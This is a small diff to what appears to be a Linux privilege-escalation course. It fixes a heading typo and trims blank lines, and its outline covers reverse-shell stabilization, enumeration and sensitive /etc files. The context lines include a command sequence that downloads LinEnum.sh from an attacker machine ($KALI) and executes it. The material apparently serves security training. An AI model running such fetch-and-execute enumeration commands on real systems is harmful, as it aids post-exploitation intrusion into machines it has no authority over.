@@ -14,7 +14,7 @@ Unit 1 - Stabilizing the shellExploring a way to transform a reverse shell into 
 
 Unit 2 - Basic enumarationEnumerate OS and the most common files to identify possible security flaws.
 
-Unit 3 - /etcUnderstand the purpose and sensitivity of files under /etc directory.
+Unit 3 - /etc Understand the purpose and sensitivity of files under /etc directory.
 
 Unit 4 - Important filesLearn to find files, containing potentially valuable information.
 
@@ -375,8 +375,3 @@ wget http://$KALI:82/LinEnum.sh
 chmod +x LinEnum.sh
 ./LinEnum.sh
 ```
-
-
-
-
-
